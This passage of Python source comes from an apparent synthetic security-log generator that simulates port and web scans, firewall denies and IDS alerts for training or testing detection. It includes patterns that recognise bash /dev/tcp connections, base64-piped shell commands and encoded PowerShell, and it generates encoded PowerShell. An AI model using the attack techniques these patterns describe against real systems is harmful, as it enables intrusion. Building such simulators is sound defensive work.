                    segment_cidrs[segment.name] = ipaddress.ip_network(
                        segment.cidr,
                        strict=False,
                    )
                except ValueError:
                    continue
            fw_sensor = next(
                (
                    candidate
                    for candidate in self.scenario.environment.network.sensors
                    if candidate.type == "firewall" and "cisco_asa" in candidate.log_formats
                ),
                None,
            )
        scan_profile_rng = random.Random(
            _stable_seed(
                "port_scan_profile:"
                f"{scan_src_ip}:{','.join(resolved_targets)}:{spec.ports}:{time.isoformat()}"
            )
        )

        spacing = 1.0 / spec.scan_rate
        total_count = 0
        for target_ip, port in _iter_shuffled_port_scan_pairs(
            resolved_targets,
            spec.ports,
            scan_profile_rng,
        ):
            real_target_ip = vip_to_real_ip.get(target_ip, target_ip)
            target_system = ip_map.get(real_target_ip)
            dst_iface = self._resolve_firewall_interface(target_ip)
            jitter_offset = rng.uniform(-spacing * 0.45, spacing * 0.55)
            scan_time = time + timedelta(seconds=total_count * spacing + jitter_offset)
            self.state_manager.set_current_time(scan_time)

            from evidenceforge.events.contexts import FirewallContext

            policy_denied = False
            if (
                is_external_scan
                and fw_sensor is not None
                and hasattr(self, "_evaluate_firewall_policy")
            ):
                policy_denied = (
                    self._evaluate_firewall_policy(
                        scan_src_ip,
                        real_target_ip,
                        port,
                        fw_sensor,
                        segment_cidrs,
                    )
                    == "deny"
                )
            if policy_denied:
                denied = True
                scan_conn_state = conn_state
                service = ""
                if scan_conn_state == "REJ":
                    duration = scan_profile_rng.uniform(0.003, 0.18)
                    orig_bytes = scan_profile_rng.randint(40, 120)
                    resp_bytes = scan_profile_rng.randint(40, 96)
                else:
                    duration = scan_profile_rng.uniform(1.2, 7.0)
                    orig_bytes = scan_profile_rng.randint(40, 96)
                    resp_bytes = 0
            else:
                denied, scan_conn_state, service, duration, orig_bytes, resp_bytes = (
                    _port_scan_connection_profile(
                        scan_profile_rng,
                        port=port,
                        target_system=target_system,
                        external=is_external_scan,
                        default_deny_state=conn_state,
                    )
                )
            firewall = (
                FirewallContext(
                    action="deny",
                    msg_id=106023,
                    connection_id=0,
                    src_interface=src_iface,
                    dst_interface=dst_iface,
                    access_group=f"{src_iface}_access_in",
                )
                if denied
                else None
            )

            self.activity_generator.generate_connection(
                src_ip=scan_src_ip,
                dst_ip=target_ip,
                time=scan_time,
                dst_port=port,
                proto=spec.protocol,
                service=service,
                duration=duration,
                orig_bytes=orig_bytes,
                resp_bytes=resp_bytes,
                conn_state=None if spec.protocol == "icmp" else scan_conn_state,
                firewall=firewall,
                emit_dns=False,
            )
            total_count += 1

        malicious_event["target_count"] = len(resolved_targets)
        malicious_event["ports"] = spec.ports
        malicious_event["total_connections"] = total_count
        malicious_event["protocol"] = spec.protocol
        return malicious_event

    def _execute_web_scan_bundle(self, request: WebScanRequest) -> dict[str, Any]:
        """Expand a web-scan action bundle through the existing storyline adapter."""

        from evidenceforge.config.web_scan_presets import (
            get_preset,
            parse_positive_finite_rate,
        )
        from evidenceforge.events.contexts import HttpContext
        from evidenceforge.generation.activity.referrer import pick_scan_referrer
        from evidenceforge.utils.ua_template import render_ua

        spec = request.spec
        system = request.system
        time = request.time
        rng = request.rng
        malicious_event = request.malicious_event

        scan_paths = []
        scan_ua = spec.user_agent or "Mozilla/5.0"
        preset_data = None
        if spec.preset:
            preset_data = get_preset(spec.preset)
            if preset_data is None:
                logger.warning("Unknown web_scan preset: %s", spec.preset)
            else:
                scan_paths = list(preset_data.get("paths", []))
                scan_ua = spec.user_agent or preset_data.get("user_agent", scan_ua)
        if spec.paths:
            scan_paths.extend(spec.paths)
        if not scan_paths:
            raise ValueError(
                f"web_scan resolved to zero paths (preset={spec.preset!r}). "
                "Check preset name or provide explicit paths."
            )

        start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
        duration_sec = None
        count = spec.count
        if spec.duration is not None:
            duration_sec = parse_duration(spec.duration).total_seconds()
        elif spec.end_time is not None:
            end_dt = self._parse_storyline_time(spec.end_time)
            duration_sec = (end_dt - start).total_seconds()
        scan_src_ip = spec.source_ip or system.ip
        scan_host = spec.hostname or spec.dst_ip
        service = "http" if spec.dst_port == 80 else "ssl"
        scan_dst_ip = spec.dst_ip
        if (
            not _is_private_ip(scan_src_ip)
            and hasattr(self, "dispatcher")
            and self.dispatcher.visibility_engine
        ):
            scan_dst_ip = self.dispatcher.visibility_engine._real_ip_to_vip.get(
                spec.dst_ip, spec.dst_ip
            )

        src_sys = None
        ip_map = getattr(self.activity_generator, "_ip_to_system", {})
        if scan_src_ip in ip_map:
            src_sys = ip_map[scan_src_ip]
        elif scan_src_ip == system.ip:
            src_sys = system
        story_pid, _story_image = self._last_storyline_process_for_system(src_sys)

        is_tls = spec.dst_port == 443
        ids_ua_def = preset_data.get("ids_ua") if preset_data else None
        ids_rate_def = preset_data.get("ids_rate") if preset_data else None
        rate_threshold = ids_rate_def.get("threshold", 20) if ids_rate_def else 20
        effective_rate = spec.rate
        if count is None and preset_data:
            max_effective_rate = preset_data.get("max_effective_rate")
            if max_effective_rate is not None:
                rate_cap = parse_positive_finite_rate(max_effective_rate)
                if rate_cap is None:
                    logger.warning(
                        "Ignoring invalid web_scan max_effective_rate for preset %s: %r",
                        spec.preset,
                        max_effective_rate,
                    )
                else:
                    effective_rate = min(effective_rate, rate_cap)
        interval_sec = _effective_rate_interval(effective_rate, count, rng)
        ua_fired = False
        last_rate_alert_ts = None
        next_rate_alert_delay = rng.uniform(45.0, 95.0)
        send_referrer_config = preset_data.get("send_referrer") if preset_data else None

        request_count = 0
        path_sequence: list[dict[str, Any]] = []

        def _next_scan_path() -> dict[str, Any]:
            nonlocal path_sequence
            if not path_sequence:
                path_sequence = list(scan_paths)
                rng.shuffle(path_sequence)
                if len(path_sequence) > 8:
                    skip_count = rng.randint(0, max(1, len(path_sequence) // 10))
                    for _ in range(skip_count):
                        if len(path_sequence) <= 4:
                            break
                        del path_sequence[rng.randrange(len(path_sequence))]
            return path_sequence.pop()

        pause_until: datetime | None = None
        for tick_time in _iter_periodic_ticks(
            start, interval_sec, duration_sec, count, spec.jitter, rng
        ):
            if pause_until is not None and tick_time < pause_until:
                continue
            if request_count > 0 and rng.random() < 0.025:
                continue
            if request_count > 0 and rng.random() < 0.008:
                pause_until = tick_time + timedelta(seconds=rng.uniform(3.0, 45.0))
                continue

            self.state_manager.set_current_time(tick_time)
            path_entry = _next_scan_path()

            method = path_entry.get("method", "GET")
            uri = _web_scan_uri_with_runtime_variation(
                str(path_entry.get("uri", "/")),
                request_count,
                random.Random(
                    _stable_seed(
                        "web_scan_uri_variation:"
                        f"{scan_src_ip}:{scan_dst_ip}:{request_count}:"
                        f"{tick_time.isoformat()}"
                    )
                ),
            )
            status = _observed_web_scan_status(
                path_entry,
                random.Random(
                    _stable_seed(
                        "web_scan_status:"
                        f"{scan_src_ip}:{scan_dst_ip}:{uri}:{request_count}:"
                        f"{tick_time.isoformat()}"
                    )
                ),
            )

            mime_type = normalize_mime_type_for_path(uri, "text/html")
            scan_referrer = (
                pick_scan_referrer(rng, scan_host, send_referrer_config, port=spec.dst_port)
                if _web_scan_path_allows_referrer(path_entry)
                else ""
            )

            response_body_len = (
                apply_transfer_size_variance(
                    response_size_for_status(status, scan_host, uri),
                    status_code=status,
                    host=scan_host,
                    uri=uri,
                    content_type=mime_type,
                    variant_key=f"{scan_src_ip}:{scan_ua}",
                )
                if status >= 400 or is_stable_resource_path(uri)
                else response_size_for_mime(rng, mime_type)
            )
            http_ctx = HttpContext(
                method=method,
                host=scan_host,
                uri=uri,
                version="1.1",
                user_agent=render_ua(scan_ua, rng),
                request_body_len=rng.randint(100, 500) if method == "POST" else 0,
                response_body_len=response_body_len,
                status_code=status,
                status_msg={
                    200: "OK",
                    301: "Moved Permanently",
                    302: "Found",
                    403: "Forbidden",
                    404: "Not Found",
                    405: "Method Not Allowed",
                    500: "Internal Server Error",
                }.get(status, "OK"),
                referrer=scan_referrer,
                resp_mime_types=[mime_type] if status == 200 else [],
                tags=[],
            )

            ids_ctx = None
            if not is_tls and ids_ua_def and not ua_fired:
                ids_ctx = IdsAlertActionBundle(
                    IdsAlertRequest(
                        signature=ids_ua_def,
                        time=tick_time,
                        src_ip=scan_src_ip,
                        dst_ip=scan_dst_ip,
                        dst_port=spec.dst_port,
                        proto="tcp",
                        rng=rng,
                        source="web_scan",
                        direction="in",
                    )
                ).execute()
                ua_fired = True
            elif not is_tls and isinstance(path_entry.get("ids"), dict):
                path_ids = path_entry["ids"]
                ids_ctx = IdsAlertActionBundle(
                    IdsAlertRequest(
                        signature=path_ids,
                        time=tick_time,
                        src_ip=scan_src_ip,
                        dst_ip=scan_dst_ip,
                        dst_port=spec.dst_port,
                        proto="tcp",
                        rng=rng,
                        source="web_scan",
                        direction="in",
                    )
                ).execute()

            if ids_ctx is None and ids_rate_def and request_count >= rate_threshold:
                fire_rate = False
                if last_rate_alert_ts is None:
                    fire_rate = True
                elif (tick_time - last_rate_alert_ts).total_seconds() >= next_rate_alert_delay:
                    fire_rate = True
                if fire_rate:
                    ids_ctx = IdsAlertActionBundle(
                        IdsAlertRequest(
                            signature=ids_rate_def,
                            time=tick_time,
                            src_ip=scan_src_ip,
                            dst_ip=scan_dst_ip,
                            dst_port=spec.dst_port,
                            proto="tcp",
                            rng=rng,
                            source="web_scan",
                            direction="in",
                        )
                    ).execute()
                    last_rate_alert_ts = tick_time
                    next_rate_alert_delay = rng.uniform(45.0, 120.0)

            conn_state, duration, orig_bytes, resp_bytes = _web_scan_connection_profile(
                rng, is_tls=is_tls
            )
            http_for_conn = http_ctx if conn_state == "SF" else None

            self.activity_generator.generate_connection(
                src_ip=scan_src_ip,
                dst_ip=scan_dst_ip,
                time=tick_time,
                dst_port=spec.dst_port,
                service=service,
                duration=duration,
                orig_bytes=orig_bytes,
                resp_bytes=resp_bytes,
                conn_state=conn_state,
                emit_dns=request_count == 0,
                source_system=src_sys,
                http=http_for_conn,
                hostname=scan_host if spec.hostname else None,
                pid=story_pid,
                ids=ids_ctx,
            )
            request_count += 1

        malicious_event["dst_ip"] = spec.dst_ip
        malicious_event["dst_port"] = spec.dst_port
        malicious_event["preset"] = spec.preset
        malicious_event["request_count"] = request_count
        return malicious_event

    def _resolve_firewall_interface(self, ip: str) -> str:
        """Resolve an IP to a firewall interface name using scenario network config."""
        import ipaddress as _ipaddress

        if not self.scenario.environment.network:
            return "outside"
        fw_sensor = next(
            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
            None,
        )
        interfaces = fw_sensor.interfaces if fw_sensor else {}
        for seg in self.scenario.environment.network.segments:
            try:
                if _ipaddress.ip_address(ip) in _ipaddress.ip_network(seg.cidr, strict=False):
                    return interfaces.get(seg.name, seg.name)
            except (ValueError, KeyError):
                continue
        return interfaces.get("_default", "outside")

    def _get_firewall_deny_conn_state(self) -> str:
        """Get the conn_state for denied connections based on firewall drop_mode."""
        if not self.scenario.environment.network:
            return "S0"
        fw_sensor = next(
            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
            None,
        )
        if fw_sensor and fw_sensor.drop_mode == "reject":
            return "REJ"
        return "S0"

    @staticmethod
    def _extract_output_file(command_line: str, os_category: str) -> str | None:
        """Extract output file path from a command line string.

        Detects common output file patterns in PowerShell, cmd, and Linux commands.
        Returns the file path if found, None otherwise.
        """
        try:
            parts = shlex.split(command_line, posix=os_category != "windows")
        except ValueError:
            parts = command_line.split()
        command_name = parts[0].rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower() if parts else ""

        patterns = [
            r'Export-Csv\s+[\'"]?([^\s\'">;]+)',  # PowerShell Export-Csv
            r'-OutFile\s+[\'"]?([^\s\'">;]+)',  # PowerShell -OutFile
            r'Out-File\s+[\'"]?([^\s\'">;]+)',  # PowerShell Out-File
            r'>\s*[\'"]?([^\s\'">;]+)',  # Shell redirect >
            r'--output[= ]\s*[\'"]?([^\s\'">;]+)',  # --output flag
        ]
        short_o_output_tools = {
            "curl",
            "wget",
            "nmap",
            "tar",
            "zip",
            "7z",
            "mysql",
            "mysqldump",
            "psql",
            "sqlcmd",
        }
        if command_name in short_o_output_tools:
            patterns.append(r'-o\s+[\'"]?([^\s\'">;]+)')  # Tool-specific output flag
        for pattern in patterns:
            match = re.search(pattern, command_line, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    @staticmethod
    def _extract_scp_destination(
        command_line: str, os_category: str
    ) -> tuple[str, str, str] | None:
        """Extract remote host, path, and username from a Linux scp command line."""
        if os_category != "linux":
            return None
        try:
            parts = shlex.split(command_line)
        except ValueError:
            parts = command_line.split()
        if not parts:
            return None
        exe = parts[0].rsplit("/", 1)[-1].lower()
        if exe != "scp":
            return None
        for token in parts[1:]:
            if token.startswith("-") or ":" not in token:
                continue
            remote, path = token.split(":", 1)
            if not remote:
                continue
            user = ""
            if "@" in remote:
                user, host = remote.rsplit("@", 1)
            else:
                host = remote
            host = host.strip("[]")
            if host and path:
                return host, path, user
        return None

    @staticmethod
    def _resolve_scp_target_user(extracted_username: str, fallback_username: str) -> str:
        """Resolve SCP target user to a scenario-compatible username."""
        username = extracted_username.strip()
        if username and re.fullmatch(r"[a-zA-Z0-9._$-]+", username):
            return username
        return fallback_username

    @staticmethod
    def _extract_scp_target(command_line: str, os_category: str) -> str | None:
        """Extract the remote host from a Linux scp command line."""
        destination = StorylineMixin._extract_scp_destination(command_line, os_category)
        return destination[0] if destination is not None else None

    @staticmethod
    def _extract_database_client_target(
        command_line: str, os_category: str
    ) -> tuple[str, int, str] | None:
        """Extract remote database endpoint details from a storyline command."""
        if os_category != "windows":
            return None
        if not re.search(r"\bsqlcmd(?:\.exe)?\b", command_line, re.IGNORECASE):
            return None

        match = re.search(
            r'(?i)\bsqlcmd(?:\.exe)?\b.*?(?:^|\s)-S\s*(?:"([^"]+)"|(\S+))',
            command_line,
        )
        if match is None:
            match = re.search(
                r'(?i)\bsqlcmd(?:\.exe)?\b.*?(?:^|\s)-S(?:"([^"]+)"|(\S+))',
                command_line,
            )
        if match is None:
            return None

        raw_target = (match.group(1) or match.group(2) or "").strip().strip("'\"")
        if not raw_target:
            return None
        target = raw_target
        if target.lower().startswith("tcp:"):
            target = target[4:]
        port = 1433
        if "," in target:
            target, port_text = target.rsplit(",", 1)
            try:
                parsed_port = int(port_text)
            except ValueError:
                parsed_port = 1433
            if 0 < parsed_port <= 65535:
                port = parsed_port
        if "\\" in target:
            target = target.split("\\", 1)[0]
        target = target.strip().strip("[]")
        if target.lower() in {"", ".", "(local)", "localhost", "127.0.0.1", "::1"}:
            return None
        return target, port, "tds"

    @staticmethod
    def _is_local_database_instance_target(target: str) -> bool:
        """Return true for SQL Server local-instance shorthands."""
        lowered = target.strip().strip("[]").lower()
        return lowered in {
            "sqlexpress",
            "mssqllocaldb",
            "(localdb)",
            ".\\sqlexpress",
            ".\\mssqllocaldb",
        } or lowered.startswith("(localdb)\\")

    @staticmethod
    def _unresolved_database_target_ip(target: str) -> str:
        """Return a deterministic unrouted internal IP for unresolved DB hosts."""
        last_octet = 10 + (_stable_seed(f"storyline_db_target:{target.lower()}") % 220)
        return f"10.0.2.{last_octet}"

    def _system_for_ip(self, ip: str) -> System | None:
        """Return the scenario system with the given IP."""
        for system in self.scenario.environment.systems:
            if system.ip == ip:
                return system
        return None

    def _emit_scp_receiver_artifacts(
        self,
        *,
        source_system: System,
        target_system: System,
        actor: User,
        source_pid: int,
        source_process: str,
        source_command: str,
        target_user: str,
        target_path: str,
        transfer_time: datetime,
        source_port: int,
        rng: random.Random,
    ) -> None:
        """Emit target-side file evidence after the SSH bundle models the transfer session."""
        ScpReceiverFileActionBundle(
            self,
            ScpReceiverFileRequest(
                source_system=source_system,
                target_system=target_system,
                actor=actor,
                source_pid=source_pid,
                source_process=source_process,
                source_command=source_command,
                target_user=target_user,
                target_path=target_path,
                transfer_time=transfer_time,
                source_port=source_port,
            ),
            rng,
        ).execute()

    @staticmethod
    def _extract_http_url(command_line: str) -> str | None:
        """Extract the first HTTP(S) URL from a storyline process command line."""
        for candidate in StorylineMixin._http_url_search_texts(command_line):
            match = re.search(r"https?://[^\s'\"),;]+", candidate, re.IGNORECASE)
            if match:
                return match.group(0).rstrip(".")
        return None

    @staticmethod
    def _http_url_search_texts(command_line: str) -> list[str]:
        """Return raw and decoded command strings to scan for embedded URLs."""
        texts = [command_line]
        shell_b64_match = re.search(
            r"(?i)(?:echo|printf)\s+['\"]?([A-Za-z0-9+/=]{16,})['\"]?\s*\|\s*base64\s+-d",
            command_line,
        )
        if shell_b64_match:
            token = shell_b64_match.group(1)
            if len(token) <= _MAX_EMBEDDED_COMMAND_B64_CHARS:
                try:
                    decoded = base64.b64decode(token, validate=True).decode("utf-8")
                except (binascii.Error, UnicodeDecodeError, ValueError):
                    decoded = ""
                if decoded and decoded not in texts:
                    texts.append(decoded)
        encoded_match = re.search(
            r"(?i)(?:-|/)(?:encodedcommand|enc|e)\s+([A-Za-z0-9+/=]+)",
            command_line,
        )
        if not encoded_match:
            return texts

        token = encoded_match.group(1)
        if len(token) > _MAX_EMBEDDED_COMMAND_B64_CHARS:
            return texts

        try:
            decoded_bytes = base64.b64decode(token, validate=True)
        except (binascii.Error, ValueError):
            return texts

        for encoding in ("utf-16le", "utf-8"):
            try:
                decoded = decoded_bytes.decode(encoding).strip("\ufeff\x00 \t\r\n")
            except UnicodeDecodeError:
                continue
            if decoded and decoded not in texts:
                texts.append(decoded)
        return texts

    @staticmethod
    def _command_contains_raw_tcp_endpoint(command_line: str, dst_ip: str, dst_port: int) -> bool:
        """Return true when a command uses bash /dev/tcp for this endpoint."""
        endpoint = f"/dev/tcp/{dst_ip}/{dst_port}"
        return any(endpoint in text for text in StorylineMixin._http_url_search_texts(command_line))

    @staticmethod
    def _parse_http_url_target(http_url: str) -> tuple[str, int] | None:
        """Parse a storyline command URL into a safe hostname and destination port."""
        from urllib.parse import urlparse

        try:
            parsed_url = urlparse(http_url)
            hostname = parsed_url.hostname
            port = parsed_url.port
        except ValueError:
            logger.debug("Ignoring malformed HTTP URL from storyline command: %s", http_url)
            return None

        if not hostname:
            return None

        return hostname, port or (443 if parsed_url.scheme.lower() == "https" else 80)

    def _resolve_storyline_network_target(self, target: str) -> str | None:
        """Resolve a storyline command target host/IP to an environment IP when possible."""
        lowered = target.rstrip(".").lower()
        if _IPV4_LITERAL_RE.fullmatch(lowered):
            return target
        ad_domain = getattr(self, "_ad_domain", "")
        for system in self.scenario.environment.systems:
            candidates = {
                system.hostname.lower(),
                system.ip,
            }
            if ad_domain:
                candidates.add(f"{system.hostname}.{ad_domain}".lower())
            if lowered in candidates:
                return system.ip
        return None

    def _storyline_authored_ip_for_hostname(self, hostname: str) -> str | None:
        """Return an explicit storyline IP for an external hostname when one exists."""
        lowered = hostname.rstrip(".").lower()
        return self._storyline_authored_ip_index().get(lowered)

    def _storyline_authored_ip_index(self) -> dict[str, str]:
        """Build a cached hostname-to-authored-IP index from storyline specs."""
        cached = getattr(self, "_storyline_authored_ip_by_hostname", None)
        if cached is not None:
            return cached

        authored_ips: dict[str, str] = {}
        for story_event in getattr(self.scenario, "storyline", []):
            for spec in getattr(story_event, "events", []):
                event_hostname = self._storyline_spec_value(spec, "hostname")
                dst_ip = self._storyline_spec_value(spec, "dst_ip")
                self._record_storyline_authored_ip(
                    authored_ips,
                    hostname=event_hostname,
                    ip=dst_ip,
                )

                query = self._storyline_spec_value(spec, "query")
                answer = self._storyline_spec_value(spec, "answer")
                self._record_storyline_authored_ip(
                    authored_ips,
                    hostname=query,
                    ip=answer,
                )

        self._storyline_authored_ip_by_hostname = authored_ips
        return authored_ips

    @staticmethod
    def _record_storyline_authored_ip(
        authored_ips: dict[str, str],
        *,
        hostname: Any,
        ip: Any,
    ) -> None:
        """Record the first valid authored IP for a normalized storyline hostname."""
        if not hostname or not isinstance(ip, str) or not _IPV4_LITERAL_RE.fullmatch(ip):
            return
        lowered = str(hostname).rstrip(".").lower()
        authored_ips.setdefault(lowered, ip)

    @staticmethod
    def _storyline_spec_value(spec: Any, field_name: str) -> Any:
        """Read a typed or raw storyline event field."""
        if isinstance(spec, dict):
            return spec.get(field_name)
        return getattr(spec, field_name, None)

    def _parse_storyline_time(self, time_str: str) -> datetime:
        """Parse storyline event time to absolute datetime.

        Supports:
        - ISO 8601 absolute time: "2024-01-15T10:30:00Z"
        - Relative offset (duration): "+2h30m"
        - Relative offset (seconds): "+7200"

        Args:
            time_str: Time string to parse

        Returns:
            Absolute datetime (UTC)

        Raises:
            ValueError: If time format is invalid
        """
        if time_str[0].isdigit() and len(time_str) > 10:
            return parse_iso8601(time_str)

        if time_str.startswith("+"):
            offset_str = time_str[1:]
            if offset_str.isdigit():
                offset = timedelta(seconds=int(offset_str))
            else:
                offset = parse_duration(offset_str)
            return self.start_time + offset

        raise ValueError(f"Invalid storyline time format: {time_str}")

    def _make_domain_sid(self, rid: int | None = None) -> str:
        """Generate a SID using the scenario's domain SID prefix."""
        rng = _get_rng()
        for sid in self.activity_generator.sid_registry.values():
            if sid.startswith("S-1-5-21-") and sid.count("-") == 7:
                prefix = "-".join(sid.split("-")[:7])
                return f"{prefix}-{rid or rng.randint(1100, 9999)}"
        return f"S-1-5-21-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rid or rng.randint(1100, 9999)}"

    def _generate_encoded_powershell(self, seed: int) -> str:
        """Generate a realistic base64-encoded PowerShell command.

        PowerShell -enc expects UTF-16LE encoded base64.
        """
        rng = _get_rng()
        cmd = rng.choice(POWERSHELL_COMMANDS)
        return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
